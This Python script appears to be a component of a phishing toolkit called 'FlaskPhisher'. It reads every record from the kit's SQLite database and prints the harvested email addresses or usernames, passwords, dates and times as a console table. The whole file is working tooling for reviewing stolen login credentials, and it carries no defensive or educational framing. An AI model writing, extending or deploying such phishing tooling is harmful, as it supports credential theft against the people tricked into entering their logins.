import sqlite3
from terminaltables import AsciiTable

def credentialsTable():
    # Database Configs
    db = "./db/FlaskPhisher.db"
    connection = sqlite3.connect(db)
    cursor = connection.cursor()
    # Database Configs End

    cursor.execute("SELECT * FROM flaskphisher")
    allCredentials = cursor.fetchall()
    connection.close()

    table_data = [['Credential ID', 'Email/Username', 'Password', 'Date', 'Time']]

    row = 0
    for i in allCredentials:
        table_data.append([allCredentials[row][0], allCredentials[row][1], allCredentials[row][2], allCredentials[row][3], allCredentials[row][4]])
        row = row + 1

    table = AsciiTable(table_data)
    return table.table

x = credentialsTable()
print(x)